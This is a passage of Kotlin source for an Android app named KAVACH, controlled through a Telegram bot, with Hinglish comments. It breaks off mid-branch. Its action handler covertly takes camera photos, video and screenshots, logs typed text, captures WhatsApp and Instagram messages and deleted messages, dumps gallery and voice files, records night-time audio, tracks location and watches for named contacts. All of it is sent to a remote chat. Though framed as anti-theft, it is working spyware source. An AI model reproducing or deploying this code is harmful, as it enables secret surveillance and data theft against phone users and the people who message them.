        api.sendMessage(chatId, "🔁 Interval complete ✔ ($n shots bheje)")
    }

    // ── mini status helpers (menu <ℹ️ Info> buttons ke liye) ──
    private fun statusText(app: Context): String {
        val i: android.content.Intent? = app.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
        val lv = i?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val sc = i?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
        val pct = if (lv >= 0 && sc > 0) (lv * 100) / sc else -1
        val up = android.os.SystemClock.elapsedRealtime() / 1000
        return "📊 ${SecureStorage.getDeviceName(app)}\n🔋 $pct% • 🔒 armed=${if (SecureStorage.isArmed(app)) "✔" else "✖"}\n⏱️ ${up / 3600}h ${(up % 3600) / 60}m uptime • 👑 HQ auto"
    }

    private fun battText(app: Context): String {
        val i = app.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED)) ?: return "❓"
        val lv = i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
        val sc = i.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
        val st = i.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1)
        val pct = if (lv >= 0 && sc > 0) (lv * 100) / sc else -1
        val charge = st == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                st == android.os.BatteryManager.BATTERY_STATUS_FULL
        return "$pct%" + if (charge) " ⚡(charging)" else ""
    }

    private fun homeText(app: Context) =
        "🎮 KAVACH Command Center — ${SecureStorage.getDeviceName(app)}\n" +
        "${CATEGORIES.size} categories • 🗂 sections inside • neat-grid ✦\n" +
        "Chuno 👇" + (if (pageCount() > 1) " (⬅➡ pages)" else "")

    private fun catText(c: Cat): String = hintCard(c.icon, c.name.uppercase(), c.acts)

    /** 📖 HINT CARD — har button ke neeche 1 line: tap karne pe kya hoga (chief order v3.9.1) */
    private fun hintCard(icon: String, title: String, acts: List<Act>): String {
        val sb = StringBuilder("$icon $title\n══════════════════\n")
        acts.forEachIndexed { i, a -> sb.append("${i + 1}) ").append(cleanLabel(a.label)).append("\n    💬 ").append(hintOf(a)).append(" \n") }
        if (sb.length > 3800) return sb.toString().take(3760) + "…\n\n(zyada items — sections se kholo)"
        return sb.toString()
    }

    /** label se numbering hatao ("🖼 2. Something" → "Something") */
    private fun cleanLabel(l: String): String = l.replace(Regex("^\\S+\\s+\\d+\\w*\\.?\\s*"), "").replace(Regex("^\\d+\\w*\\.?\\s*"), "").trim()

    /** 🧠 cryptic buttons ke liye asli hint; baaki = label hi kaafi hai */
    private fun hintOf(a: Act): String = CRYPTIC_HINTS[a.id] ?: cleanLabel(a.label)

    private val CRYPTIC_HINTS = mapOf(
        "dual" to "front+back EK SAATH — singer ka group-photo",
        "thumbs" to "gallery ke last-10 photo thumbnails",
        "tlapse" to "1 ghante ka time-lapse strip",
        "ssmon" to "kaun kab screen-use kar raha — session timeline",
        "ssmart" to "screenshot+camera+state ka combo report",
        "mmon" to "mic-level monitor (awaaz aaye to graph)",
        "panic" to "MAX-PANIC: siren+lock+photo — THEFT combo",
        "mint" to "mic intent-peek (kaun chal raha)",
        "camai" to "photo sirf tab, jab frame me chehra",
        "zoom1" to "zoom 1x preset",
        "wadump" to "WA .Statuses folder ka SAB kuch",
        "wamsgs" to "notif se pakde WA msgs (buffer)",
        "wamon" to "WA watcher+target ka status",
        "igmsgs" to "IG notif-buffer",
        "clread" to "abhi clipboard me kya hai",
        "r_godx" to "AlertBus+fence+sim+lowbatt+relay sab ek saath",
        "decoyon" to "fake-shutdown natak; chor ko chakma 😈",
        "r_evhq" to "evidence-grade HQ photo (for FIR/complaint)",
        "r_wacall" to "WA call aaye/miss ho = instant alert",
        "r_wadelete" to "delete-for-everyone pakadna ON/OFF",
        "r_shadow" to "focused field me jo TYPE hua (password SKIP 🔒)",
        "r_nightear" to "12-5am awaaz spike = 15s clip (charging pe)",
        "r_money" to "UPI notifications se auto hisaab-kitab",
        "r_notif" to "SAB apps ki notif archive-search"
    )

    // ═══════════════ PUBLIC ENTRY ═══════════════

    // 🧹 last menu message yaad rakho — naya menu aaye to purana delete (chat patli rahe)
    private val lastKbMsg = java.util.concurrent.ConcurrentHashMap<Long, Long>()

    suspend fun show(app: Context, api: TelegramApi, chatId: Long) {
        lastKbMsg[chatId]?.takeIf { it > 0 }?.let { old ->
            if (com.kavach.app.security.SecureStorage.isClean(app))
                runCatching { api.deleteMessage(chatId, old) }
        }
        val id = api.sendKb(chatId, homeText(app), homeMarkup(0))
        if (id > 0) lastKbMsg[chatId] = id.toLong()
    }

    suspend fun onCallback(app: Context, api: TelegramApi, chatId: Long, msgId: Long, cbId: String, data: String) {
        runCatching {
            when {
                data.startsWith("pg:") -> {
                    val p = data.removePrefix("pg:").toIntOrNull() ?: 0
                    api.answerCb(cbId)
                    api.editKb(chatId, msgId, homeText(app), homeMarkup(p))
                }
                data.startsWith("cat:") -> {
                    val idx = data.removePrefix("cat:").toIntOrNull() ?: 0
                    if (idx in CATEGORIES.indices) {
                        api.answerCb(cbId)
                        if (!GROUPS[idx].isNullOrEmpty())
                            api.editKb(chatId, msgId, "${CATEGORIES[idx].icon} ${CATEGORIES[idx].name.uppercase()} — section chuno 🗂", groupsMarkup(idx))
                        else
                            api.editKb(chatId, msgId, catText(CATEGORIES[idx]), catMarkup(idx))
                    } else api.answerCb(cbId)
                }
                data.startsWith("grps:") || data.startsWith("grp:") -> {
                    val t = data.split(":")
                    val idx = t.getOrNull(1)?.toIntOrNull() ?: -1
                    if (idx !in CATEGORIES.indices || GROUPS[idx].isNullOrEmpty()) { api.answerCb(cbId); return@runCatching }
                    if (t[0] == "grps") {
                        api.answerCb(cbId)
                        api.editKb(chatId, msgId, "${CATEGORIES[idx].icon} ${CATEGORIES[idx].name.uppercase()} — section chuno 🗂", groupsMarkup(idx))
                    } else {
                        val gi = t.getOrNull(2)?.toIntOrNull() ?: 0
                        val g = GROUPS[idx]!!.getOrNull(gi)
                        if (g == null) { api.answerCb(cbId); return@runCatching }
                        val wanted = g.second
                        val got = CATEGORIES[idx].acts.filter { it.id in wanted }
                        api.answerCb(cbId)
                        api.editKb(chatId, msgId, hintCard(CATEGORIES[idx].icon, g.first, got),
                            actsMarkup(idx, got, "grps:$idx", "🔙 Sections"))
                    }
                }
                data.startsWith("do:") -> {
                    parts(data).let { (idx, id) -> runAct(app, api, chatId, cbId, idx, id) }
                }
                data.startsWith("eye") || data == "waloff" -> runAct(app, api, chatId, cbId, -1, data)
                else -> api.answerCb(cbId)
            }
        }
    }

    private fun parts(data: String): Pair<Int, String> {
        val t = data.removePrefix("do:")
        val ix = t.indexOf(':')
        return (t.substring(0, ix).toIntOrNull() ?: 0) to t.substring(ix + 1)
    }

    // ═══════════════ ACTION RUNNER (existing primitives wired) ═══════════════

    private suspend fun runAct(app: Context, api: TelegramApi, chatId: Long, cbId: String, catIdx: Int, id: String) {
        when (id) {
            // ── 🧰 runText bridge: menu-button → text-command (v3.9.1 orphan-coverage) ──
            "r_wastars" -> { api.answerCb(cbId, "⭐…"); runText(app, api, chatId, "/wastars") }
            "r_wacall" -> { api.answerCb(cbId, "📞…"); runText(app, api, chatId, "/wacall") }
            "r_wadelete" -> { api.answerCb(cbId, "🗑…"); runText(app, api, chatId, "/wadelete") }
            "r_evhq" -> { api.answerCb(cbId, "🧾…"); runText(app, api, chatId, "/evhq") }
            "r_apk" -> { api.answerCb(cbId, "📦…"); runText(app, api, chatId, "/apk") }
            "r_lastping" -> { api.answerCb(cbId, "🔋…"); runText(app, api, chatId, "/lastping") }
            "r_ghostnotif" -> { api.answerCb(cbId, "👻…"); runText(app, api, chatId, "/ghostnotif") }
            "r_notif" -> { api.answerCb(cbId, "🧬…"); runText(app, api, chatId, "/notif") }
            "r_notifxray" -> { api.answerCb(cbId, "🗑…"); runText(app, api, chatId, "/notifxray") }
            "r_money" -> { api.answerCb(cbId, "💰…"); runText(app, api, chatId, "/money") }
            "r_nightear" -> { api.answerCb(cbId, "👂…"); runText(app, api, chatId, "/nightear") }
            "r_motion" -> { api.answerCb(cbId, "🏃…"); runText(app, api, chatId, "/motion") }
            "r_shadow" -> { api.answerCb(cbId, "⌨️…"); runText(app, api, chatId, "/shadow") }
            "r_godx" -> { api.answerCb(cbId, "⚡…"); runText(app, api, chatId, "/godx") }
            "r_logs" -> { api.answerCb(cbId, "📜…"); runText(app, api, chatId, "/logs") }
            "r_report" -> { api.answerCb(cbId, "📊…"); runText(app, api, chatId, "/report") }
            "r_outbox" -> { api.answerCb(cbId, "📤…"); runText(app, api, chatId, "/outbox") }
            "r_kstore" -> { api.answerCb(cbId, "🗃…"); runText(app, api, chatId, "/kstore") }
            "r_janitor" -> { api.answerCb(cbId, "🧹…"); runText(app, api, chatId, "/janitor") }
            "r_help" -> { api.answerCb(cbId, "❓…"); runText(app, api, chatId, "/helpall") }
            "t_wasearch" -> tipMsg(api, chatId, cbId, "🔤 VAULT-SEARCH (disk-log)\n\n👉 /wasearch <naam/word>\n(jaise: /wasearch address)")
            "t_pair" -> {   // 🧾 v3.9.2 chief: placeholder-edit NAHI — ASLI ready-to-send line bhejo
                val c = com.kavach.app.security.PairingManager.ensurePendingCode(app)
                api.answerCb(cbId, "🔗 $c")
                api.sendMessage(chatId, "🔗 PAIRING — is device ka STABLE code: $c\n\n" +
                    "Is message ko COPY karo aur APMAN MAIN-BOT (@Baap_bot wale) pe bhej do:\n\n<code>/pair $c</code>\n\n" +
                    "✅ Code thread-proof — REINSTALL ke baad BHI YEHI rahega (device shaadi permanent 💍)")
            }
            "t_key" -> {   // 🧾 SECRET-KEY: asli code dinafikha
                val c = com.kavach.app.security.PairingManager.ensurePendingCode(app)
                api.answerCb(cbId, "🔑 $c")
                api.sendMessage(chatId, "🔑 SECRET-KEY $c — MAIN bot pe EXACT ye bhejo (angle-bracket mat lagao):\n\n<code>/key $c</code>\n\nYe onboarding ka 'ghar-jodne' code hai — ek device = permanent code ✅")
            }
            "t_evhq" -> tipMsg(api, chatId, cbId, "🧾 HQ EVIDENCE:\n\n👉 /evhq  → front photo zero-compress original\n👉 /evhq back → rear camera — FIR/complaint grade")
            "camf" -> photoAction(app, api, chatId, cbId, front = true)
            "camr" -> photoAction(app, api, chatId, cbId, front = false)
            "camai" -> {
                api.answerCb(cbId, "🧠 AI scan chal raha…")
                if (!KavachCamera.ready(app)) { api.sendMessage(chatId, "⚠️ Camera permission 🟢 nahi hai"); return }
                api.sendMessage(chatId, "🧠 Photo + AI intruder check…")
                val jpg = KavachCamera.photo(app, true)
                if (jpg == null) { api.sendMessage(chatId, "❌ Photo fail"); return }
                val faces = FaceGuard.facesIn(jpg)
                when {
                    faces > 0 -> api.sendPhoto(chatId, jpg, "🧠 INSAAN MILI! (${faces} face) — yahi hai wo 👁️")
                    faces == 0 -> api.sendPhoto(chatId, jpg, "🐶 Chehre NAHI (parde/pet angle ho sakta) — reference ke liye")
                    else -> api.sendPhoto(chatId, jpg, "🤷 AI busy — photo bhej diya")
                }
            }
            "camflash" -> {
                api.answerCb(cbId, "⚡ flash…")
                if (!KavachCamera.ready(app)) { api.sendMessage(chatId, "⚠️ Camera permission 🟢 nahi hai"); return }
                api.sendMessage(chatId, "⚡ Screen full-white 1 sec — chehra ready!")
                KavachExtras.flashOn(app, 1000)
                val jpg = KavachCamera.photo(app, true)
                if (jpg != null) api.sendPhoto(chatId, jpg, "⚡ LOW-LIGHT capture — andhera bhi fail 🌙")
                else api.sendMessage(chatId, "❌ Photo fail (overlay permission 🟢 check karo panel me)")
            }
            "zoomp" -> {
                KavachCamera.zoomStep = (KavachCamera.zoomStep + 1).coerceAtMost(4)
                api.answerCb(cbId, "🔍 Zoom x${KavachCamera.zoomStep + 1}")
                photoAction(app, api, chatId, cbId, front = KavachCamera.facingFrontLast, extraCap = "🔍 x${KavachCamera.zoomStep + 1}")
            }
            "zoomm" -> {
                KavachCamera.zoomStep = (KavachCamera.zoomStep - 1).coerceAtLeast(0)
                api.answerCb(cbId, "🔎 Zoom x${KavachCamera.zoomStep + 1}")
                photoAction(app, api, chatId, cbId, front = KavachCamera.facingFrontLast, extraCap = "🔎 x${KavachCamera.zoomStep + 1}")
            }
            "zoom1", "zoom2", "zoom4" -> {
                KavachCamera.zoomStep = (id.removePrefix("zoom").toIntOrNull() ?: 1) - 1
                api.answerCb(cbId, "📏 x${id.removePrefix("zoom")}")
                photoAction(app, api, chatId, cbId, front = KavachCamera.facingFrontLast, extraCap = "📏 preset x${id.removePrefix("zoom")}")
            }
            "dual" -> {
                api.answerCb(cbId, "🎯 dual…")
                if (!KavachCamera.ready(app)) { api.sendMessage(chatId, "⚠️ Camera permission 🟢 nahi hai"); return }
                api.sendChatAction(chatId, "upload_photo")
                api.sendMessage(chatId, "🎯 DUAL-SHOT — dono cameras…")
                val f = KavachCamera.photo(app, true)
                Thread.sleep(600)
                val b = KavachCamera.photo(app, false)
                val list = mutableListOf<Pair<ByteArray, String>>()
                f?.let { list.add(it to "🤳 samne kya hai?") }
                b?.let { list.add(it to "📷 peeche kya hai?") }
                if (list.isNotEmpty()) {
                    api.sendMediaGroup(chatId, list)
                    api.sendMessage(chatId, "🎯 DUAL complete — dono angle! 🔫")
                } else api.sendMessage(chatId, "❌ Dual fail")
            }
            "dfdocs" -> {
                api.answerCb(cbId, "🔍 docs dhundh raha…")
                api.sendMessage(chatId, "🪪 DOCS deep-scan shuru — 🐢 hang-proof mode")
                val rep = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) {
                    runCatching { com.kavach.app.core.deepfind.deepfind(app, "docs").first }.getOrElse { "❌ ${it.javaClass.simpleName}" }
                }
                rep.chunked(3800).forEach { api.sendMessage(chatId, it) }
            }
            "dfword" -> {
                api.answerCb(cbId)
                api.sendMessage(chatId, "🔤 WORD-SEARCH:\n/chrome type karo → <code>/deepfind aadhaar</code> ya <code>/deepfind 4321</code>\n📦 Naam + OCR text dono me match hota hai (index-first, smart 🧠)")
            }
            "dfdive" -> {
                api.answerCb(cbId)
                api.sendMessage(chatId, "🤿 DEEPAK DIVE — sentence me bolo, main samajh jaunga:\n• <code>/dive white gadi red shirt wala aadmi</code>\n• <code>/dive mera aadhaar card</code>\n• <code>/dive kutta wali photo</code>\n• <code>/dive blue sky ke neeche ped</code>\n🏷 objects (gadi/bike/kutta/aadmi…) + 🎨 colors (safed/laal/neela…) + 📝 text — teeno mila ke khojta hoon")
            }
            "dfstats" -> {
                api.answerCb(cbId)
                val st = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) { com.kavach.app.core.deepfind.deepstats(app) }
                api.sendMessage(chatId, st)
            }
            "dfhelp" -> {
                api.answerCb(cbId, "📚 file bhej raha…")
                val f = com.kavach.app.core.help.HelpCenter.helpFile(app, "deepfind")
                api.sendMedia(chatId, "doc", f.readBytes(), "text/plain", f.name, "🔍 DeepFind HELP")
                f.delete()
            }
            "thumbs" -> {
                api.answerCb(cbId, "🖼️ gallery…")
                val t = KavachExtras.recentGallery(app, 10)
                if (t.isEmpty()) { api.sendMessage(chatId, "⚠️ Photos read permission 🟢 nahi — panel dekho!"); return }
                t.map { (b, n, d) -> b to "$n • $d" }.chunked(10)
                    .forEach { api.sendMediaGroup(chatId, it) }
                api.sendMessage(chatId, "🖼️ Last ${t.size} phones — gallery glimpse ✔")
            }
            "vidsf", "vidsb" -> {
                val front = id.endsWith("f")
                api.answerCb(cbId, "🎬 ${if (front) "Front" else "Back"}…")
                if (!KavachCamera.ready(app)) { api.sendMessage(chatId, "⚠️ Camera permission 🟢 nahi hai"); return }
                if (KavachCamera.videoStart(app, front)) {
                    api.sendMessage(chatId, "🔴 REC ON (${if (front) "SAMNE" else "PEECHE"} cam) — lamba kheencho! ⏹ pe send.")
                } else api.sendMessage(chatId, "❌ Video start fail (busy?)")
            }
            "vidstop" -> {
                api.answerCb(cbId, "⏹ send…")
                Thread.sleep(700)
                val v = KavachCamera.videoStop()
                if (v != null) api.sendMedia(chatId, "video", v, "video/mp4", "kavach.mp4", "🎬 REC DONE — recorded packet 📤")
                else api.sendMessage(chatId, "⚠️ Koi active recording nahi tha")
            }
            "tlapse" -> {
                api.answerCb(cbId, "🕐 1hr me…")
                if (!KavachCamera.ready(app)) { api.sendMessage(chatId, "⚠️ Camera permission 🟢 nahi hai"); return }
                api.sendMessage(chatId, "🕐 TIMELAPSE shuru: 60 min × har min 1 shot. ⏹ pe partial bhej dunga. (Video-stitch next update 🛠️)")
                KavachCamera.tlStart(app, true, 60,
                    onBatch = { batch, range ->
                        // album batches bhej
                        val items = batch.mapIndexed { i, bb -> bb to "🕐 T+${range.first + i - 1}min" }
                        kotlinx.coroutines.runBlocking { api.sendMediaGroup(chatId, items) }
                    },
                    onDone = { kotlinx.coroutines.runBlocking { api.sendMessage(chatId, "🕐 Timelapse POORI! ⏱ strip ready ✔") } }
                )
            }
            "tlstop" -> {
                api.answerCb(cbId, "⏹ TL…")
                KavachCamera.tlStop()
                api.sendMessage(chatId, "🕐 TL band. Partial shots upar aaye honge ✔")
            }
            // ═════════ 📱 SCREENSHOT / SCREEN (Category 2) ═════════
            "ss" -> ssShot(app, api, chatId, cbId)
            "ssdoc" -> {
                api.answerCb(cbId, "📄 doc mode…")
                val jpg = ssGuard(app, api, chatId) ?: return@runAct
                api.sendChatAction(chatId, "upload_document")
                api.sendMedia(chatId, "doc", jpg, "image/jpeg", "screen_${System.currentTimeMillis()}.jpg", "📄 Screenshot (📎 original quality • ${jpg.size / 1024}KB)")
            }
            "ssdl5" -> ssDelay(app, api, chatId, cbId, 5)
            "ssdl10" -> ssDelay(app, api, chatId, cbId, 10)
            "ssdl20" -> ssDelay(app, api, chatId, cbId, 20)
            "ssin5" -> ssInterval(app, api, chatId, cbId, 5, 10)
            "ssin30" -> ssInterval(app, api, chatId, cbId, 30, 4)
            "ssmon" -> { api.answerCb(cbId, "🕵️ report…"); api.sendMessage(chatId, com.kavach.app.core.screen.KavachScreen.monitorText(app)) }
            "wcha", "wtel", "wdil", "wgal", "wchr" -> {
                val pkg = when (id) {
                    "wcha" -> "com.whatsapp"; "wtel" -> "org.telegram.messenger"; "wdil" -> "com.google.android.dialer"
                    "wgal" -> "com.google.android.apps.photos"; else -> "com.android.chrome"
                }
                api.answerCb(cbId, "👁 watch…")
                if (!com.kavach.app.core.screen.KavachScreen.sessionAlive()) { api.sendMessage(chatId, "♿ Screen-power OFF — 11-TAP panel se 🔑 ON karo (a11y — reboot-proof 🪦)"); return@runAct }
                api.sendMessage(chatId, "👁 APP-WATCH ON — ${pkg.substringAfterLast('.')} khulte hi silent shot! 🎯 (✋ se band)")
                com.kavach.app.core.screen.KavachScreen.watchStart(app, setOf(pkg)) { hit, shot ->
                    kotlinx.coroutines.runBlocking {
                        api.sendMessage(chatId, "🎯 STRIKE! ${com.kavach.app.core.screen.KavachScreen.pretyAppName(app, hit)} khuli — ${com.kavach.app.core.screen.KavachScreen.timeStamp()}")
                        shot?.let { api.sendPhoto(chatId, it, "👁 ${hit.substringAfterLast('.')} — live frame") }
                    }
                }
            }
            "woff" -> { api.answerCb(cbId, "✋ off"); com.kavach.app.core.screen.KavachScreen.watchStop(); api.sendMessage(chatId, "👁 App-watch band 🤫") }
            "ocr" -> {
                api.answerCb(cbId, "📝 OCR…")
                val jpg = ssGuard(app, api, chatId) ?: return@runAct
                api.sendMessage(chatId, "📝 Text nikaal raha hoon…")
                val txt = com.kavach.app.core.screen.KavachScreen.ocr(jpg)
                if (txt.isNullOrBlank()) api.sendMessage(chatId, "😐 Koi text nahi mila (blank screen?)")
                else txt.chunked(3800).forEach { api.sendMessage(chatId, "📝 OCR:\n$it") }
            }
            "desc" -> {
                api.answerCb(cbId, "🧠 dekha raha…")
                val jpg = ssGuard(app, api, chatId) ?: return@runAct
                api.sendMessage(chatId, "🧠 AI scene dekh raha hai…")
                val d = com.kavach.app.core.screen.KavachScreen.describe(jpg)
                api.sendMessage(chatId, if (d != null) "🧠 SCENE SAMAJH:\n$d" else "😐 AI describe fail")
            }
            "links" -> {
                api.answerCb(cbId, "🔗…")
                val jpg = ssGuard(app, api, chatId) ?: return@runAct
                val txt = com.kavach.app.core.screen.KavachScreen.ocr(jpg) ?: run { api.sendMessage(chatId, "😐 OCR fail"); return@runAct }
                val found = com.kavach.app.core.screen.KavachScreen.extractLinks(txt)
                if (found.isEmpty()) api.sendMessage(chatId, "🔗 Koi link nahi mila is shot me")
                else api.sendMessage(chatId, "🔗 LINKS MILE (${found.size}):\n" + found.joinToString("\n") { "  • $it" })
            }
            "shist" -> {
                api.answerCb(cbId, "🗂…")
                val h = com.kavach.app.core.screen.KavachScreen.historyShots()
                if (h.isEmpty()) api.sendMessage(chatId, "🗂 History khaali — pehle koi shot kheencho 📸")
                else {
                    api.sendMessage(chatId, "🗂 HISTORY — last ${h.size} shots 📤")
                    h.mapIndexed { i, bb -> bb to "🗂 ${i + 1}/${h.size}" }.chunked(10).forEach { api.sendMediaGroup(chatId, it) }
                }
            }
            "state" -> { api.answerCb(cbId, "🔆…"); api.sendMessage(chatId, "🔆 SCREEN STATE:\n" + com.kavach.app.core.screen.KavachScreen.screenState(app)) }
            "ssmart" -> {
                api.answerCb(cbId, "🧾 report…")
                val jpg = ssGuard(app, api, chatId) ?: return@runAct
                api.sendMessage(chatId, "🧾 SMART REPORT bana raha hoon (shot+ocr+scene+links)…")
                api.sendPhoto(chatId, jpg, "📸 SMART REPORT • ${com.kavach.app.core.screen.KavachScreen.timeStamp()}")
                val txt = com.kavach.app.core.screen.KavachScreen.ocr(jpg)
                if (!txt.isNullOrBlank()) txt.chunked(3800).forEach { api.sendMessage(chatId, "📝 OCR:\n$it") } else api.sendMessage(chatId, "📝 OCR: (koi text nahi)")
                val d = com.kavach.app.core.screen.KavachScreen.describe(jpg)
                if (d != null) api.sendMessage(chatId, "🧠 SCENE:\n$d")
                val found = if (!txt.isNullOrBlank()) com.kavach.app.core.screen.KavachScreen.extractLinks(txt) else emptyList()
                if (found.isNotEmpty()) api.sendMessage(chatId, "🔗 LINKS:\n" + found.joinToString("\n") { "  • $it" })
            }
            "loc" -> {
                api.answerCb(cbId, "📍 dhundh raha…")
                api.sendMessage(chatId, "⏳ Location dhundh raha hoon…")
                api.sendMessage(chatId, com.kavach.app.core.location.KavachLocation.fullText(app))
            }
            "locaddr" -> { api.answerCb(cbId, "🏠…"); api.sendMessage(chatId, "🏠 ADDRESS:\n" + com.kavach.app.core.location.KavachLocation.address(app)) }
            "bcnon" -> {
                api.answerCb(cbId, "📡…")
                val ok = com.kavach.app.core.location.KavachLocation.beaconStart(app) { s -> kotlinx.coroutines.runBlocking { api.sendMessage(chatId, s) } }
                api.sendMessage(chatId, if (ok) "📡 BEACON ON — har 10min me 6 ping 🛰 (⏹ se pehle band karna)" else "⚠️ Permission 🔴 ya already ON")
            }
            "bcnoff" -> { api.answerCb(cbId, "⏹"); com.kavach.app.core.location.KavachLocation.beaconStop(); api.sendMessage(chatId, "📡 Beacon band 🗺") }
            "fen100", "fen500" -> {
                val r = if (id == "fen500") 500 else 100
                api.answerCb(cbId, "🚧…")
                val ok = com.kavach.app.core.location.KavachLocation.fenceStart(app, r) { s -> kotlinx.coroutines.runBlocking { api.sendMessage(chatId, s) } }
                api.sendMessage(chatId, if (ok) "🚧 FENCE ON — ABHI ke center se ${r}m zone! Bahar nikla = alert 🚨 (⏹ se band)" else "⚠️ GPS nahi mili is pal — thodi baar baar dobara karo")
            }
            "fenoff" -> { api.answerCb(cbId, "⏹"); com.kavach.app.core.location.KavachLocation.fenceStop(); api.sendMessage(chatId, "🚧 Fence band 🔓") }
            "spd" -> { api.answerCb(cbId, "🚗…"); api.sendMessage(chatId, com.kavach.app.core.location.KavachLocation.speedText(app)) }
            "lochist" -> { api.answerCb(cbId, "📜…"); com.kavach.app.core.location.KavachLocation.historyText().chunked(3900).forEach { api.sendMessage(chatId, it) } }
            "locmon" -> { api.answerCb(cbId, "📊…"); api.sendMessage(chatId, "📊 LOCATION MONITOR\n" + com.kavach.app.core.location.KavachLocation.monitorText()) }
            // ═════════ 💬 WHATSAPP (v2.2.0) ═════════
            "wadump" -> {
                api.answerCb(cbId, "📣…")
                val st = com.kavach.app.core.wa.KavachWA.latestStatuses(30)
                if (st.isEmpty()) { api.sendMessage(chatId, "🍃 Koi STATUS nahi mila — /sdcard/Android/media/com.whatsapp/WhatsApp/Media/.Statuses\n(All-files access 🟢?)"); return@runAct }
                api.sendMessage(chatId, "📣 STATUS-DUMP — ${st.size} files 📤")
                waSendFiles(api, chatId, st, "📣 status")
            }
            "waimg" -> { api.answerCb(cbId, "🖼…"); waSendFiles(api, chatId, com.kavach.app.core.wa.KavachWA.latestImages(15), "🖼 WA") }
            "wavid" -> { api.answerCb(cbId, "🎬…"); waSendFiles(api, chatId, com.kavach.app.core.wa.KavachWA.latestVideos(6), "🎬 WA") }
            "wavo" -> {
                api.answerCb(cbId, "🎙…")
                val (msg, backup) = com.kavach.app.core.wa.KavachWA.voiceBackup(8)
                api.sendMessage(chatId, msg)
                com.kavach.app.core.wa.KavachWA.latestVoices(8).forEachIndexed { i, f ->
                    runCatching {
                        api.sendChatAction(chatId, "upload_voice")
                        api.sendMedia(chatId, "voice", f.readBytes(), "audio/ogg", "wa_${i + 1}_${f.name}", "🎙 WA voice #${i + 1} • ${f.name}")
                    }
                }
            }
            "wastore" -> { api.answerCb(cbId, "📊…"); api.sendChatAction(chatId, "typing"); com.kavach.app.core.wa.KavachWA.storageReport().chunked(3900).forEach { api.sendMessage(chatId, it) } }
            "waclean" -> { api.answerCb(cbId, "🧹…"); api.sendChatAction(chatId, "typing"); api.sendMessage(chatId, com.kavach.app.core.wa.KavachWA.junkClean()) }
            "wamsgs" -> {
                api.answerCb(cbId, "📩…")
                com.kavach.app.core.notify.KavachNotify.recentText("").chunked(3900).forEach { api.sendMessage(chatId, it) }
            }
            "wamsgt" -> tipMsg(api, chatId, cbId, "🔍 CONTACT ko dhundhna:\n\n👉 /wamsg <naam>\n(jaise: /wamsg puja — uske naam ke sab captured messages dikh jayenge 📩)\n⚠️ Note: photo/video media TG pe bitim mathi (text-only capture!)")
            "wawatcht" -> tipMsg(api, chatId, cbId, "🎯 TARGET WATCH:\n\n👉 /wawatch <naam>\n(jaise: /wawatch priya)\n\nUs naam se jo bhi WA notif aaya = ALERT 🚨 + message bhi saat! (⏹ stop: /waoff ya button)")
            "waoff" -> {
                api.answerCb(cbId, "⏹")
                com.kavach.app.core.notify.KavachNotify.targetStop()
                api.sendMessage(chatId, "🎯 Target-watch band 🤫")
            }
            "wamon" -> { api.answerCb(cbId, "📊…"); api.sendMessage(chatId, "💬 WA MONITOR\n" + com.kavach.app.core.notify.KavachNotify.monitorText()) }
            "wmvtog" -> {
                val MV = com.kavach.app.core.media.MediaVault
                MV.setOn(app, !MV.isOn(app))
                api.answerCb(cbId, if (MV.isOn(app)) "🛡 ON ✅" else "⏹ OFF")
                api.sendMessage(chatId, "🛡 MEDIA-VAULT ${if (MV.isOn(app)) "ON — WA/IG folders live-watch, nayi file = instant hidden-copy 🔐" else "OFF"}\n(vanish bhi pakda jayega 🚨)")
            }
            "wmvlist" -> { api.answerCb(cbId, "📂…"); api.sendMessage(chatId, com.kavach.app.core.media.MediaVault.list(app, 8)) }
            "wmvlist10" -> { api.answerCb(cbId, "📂…"); api.sendMessage(chatId, com.kavach.app.core.media.MediaVault.list(app, 10)) }
            "wmvlist20" -> { api.answerCb(cbId, "📂…"); api.sendMessage(chatId, com.kavach.app.core.media.MediaVault.list(app, 20)) }
            "wmvstats" -> { api.answerCb(cbId, "🚨…"); api.sendMessage(chatId, com.kavach.app.core.media.MediaVault.status(app)) }
            "wapeeps" -> { api.answerCb(cbId, "📣…"); runText(app, api, chatId, "/wapeeps") }
            "iglogx" -> { api.answerCb(cbId, "📄…"); runText(app, api, chatId, "/iglog") }
            "igdelx" -> { api.answerCb(cbId, "🗑…"); runText(app, api, chatId, "/igdeleted") }
            "ksurv" -> { api.answerCb(cbId, "💉…"); runText(app, api, chatId, "/survive") }
            "klife" -> { api.answerCb(cbId, "🫀…"); runText(app, api, chatId, "/life") }
            "khiber" -> { api.answerCb(cbId, "🧟…"); api.sendMessage(chatId, com.kavach.app.core.shield.SurvivalKit.openAutoRevokeGuard(app)) }
            "kbatt" -> { api.answerCb(cbId, "🔋…"); api.sendMessage(chatId, com.kavach.app.core.shield.SurvivalKit.openBatteryExempt(app)) }
            "koem" -> { api.answerCb(cbId, "📟…"); api.sendMessage(chatId, com.kavach.app.core.shield.SurvivalKit.openOemRescue(app) + "\n\n📊 full status: /survive") }
            "botstyle" -> { api.answerCb(cbId, "🎨…"); runText(app, api, chatId, "/botstyle") }
            // ── 📸 IG category (pro/advanced) ──
            "igstat" -> { api.answerCb(cbId, "📊…"); api.sendMessage(chatId, com.kavach.app.core.ig.IgGod.status(app)) }
            "igmsgs" -> { api.answerCb(cbId, "📩…"); api.sendMessage(chatId, com.kavach.app.core.notif.NotiXray.query(app, "com.instagram.android", 12)) }
            "igsrc" -> tipMsg(api, chatId, cbId, "🔍 IG ARCHIVE-SEARCH:\n\n👉 /igsearch <naam/jaagran word>\n(jaise: /igsearch rahul)\n🔔 live IG notifs: /ignotif")
            "igstars" -> { api.answerCb(cbId, "⭐…"); api.sendMessage(chatId, "⭐ IG STARS:\n" + com.kavach.app.core.ig.IgGod.stars(app).let { if (it.isEmpty()) "koi star nahi — /igstar NAAM" else it.joinToString("\n") { n -> "⭐ $n" } } + "\n\n➕ add: /igstar <naam> • ➖ /igunstar <naam>") }
            "igdeltog" -> {
